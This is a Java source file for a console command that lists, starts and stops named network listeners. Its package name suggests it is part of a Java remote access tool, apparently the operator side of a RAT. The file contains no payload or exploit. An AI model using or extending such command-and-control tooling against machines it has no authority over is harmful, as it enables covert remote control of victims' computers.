package net.jrat.core.command.commands;

import net.jrat.core.command.Command;
import net.jrat.core.listener.Listener;
import net.jrat.core.listener.State;
import net.jrat.utils.Formatter;
import net.jrat.utils.Logger;

public class ToggleListener extends Command
{
	public ToggleListener()
	{
		super("tggllistener", new String[] { "-name", "-action" }, new String[] { "sets the name of the listener", "sets the action (start/stop/list)" }, "toggles a listeners state");
	}

	@Override
	public void execute(String[] arguments) throws Exception
	{
		final String action = Formatter.getValue(arguments, "-action=").defaultTo(null);
		
		if(action == null)
			throw new Exception("action is needed");
		
		if(!(action.equalsIgnoreCase("start")) && !(action.equalsIgnoreCase("stop")) && !(action.equalsIgnoreCase("list")))
			throw new Exception("action is invalid");
		
		if(action.equalsIgnoreCase("list"))
		{
			Logger.log("listing listeners");
			{
				Logger.startFrequence();
				
				for(Listener listener : this.server.listenerManager.listeners)
				{
					final int port = listener.serverSocket.getLocalPort();
					final String output = listener.name + " (" + port + "): " + listener.state.name;
					
					Logger.log(output);
				}
				
				Logger.stopFrequence();
			}
			Logger.log("done");
			
			return;
		}
		
		final String name = Formatter.getValue(arguments, "-name=").defaultTo(null);
		
		if(name == null)
			throw new Exception("name is needed");
		
		final Listener listener = this.server.listenerManager.getListener(name);
		
		if(listener == null)
			throw new Exception("listener not found");
		
		String stateName = "";
		if(action.equalsIgnoreCase("start"))
			stateName = "started";
		else if(action.equalsIgnoreCase("stop"))
			stateName = "stopped";
		
		final State state = this.server.listenerManager.getState(stateName);
		final State preState = listener.state;
		
		listener.state = state;
		
		if(state == State.STARTED && !(preState == State.STARTED))
			listener.startThread();
		
		Logger.log("listener's state set to " + state.name);
	}
}
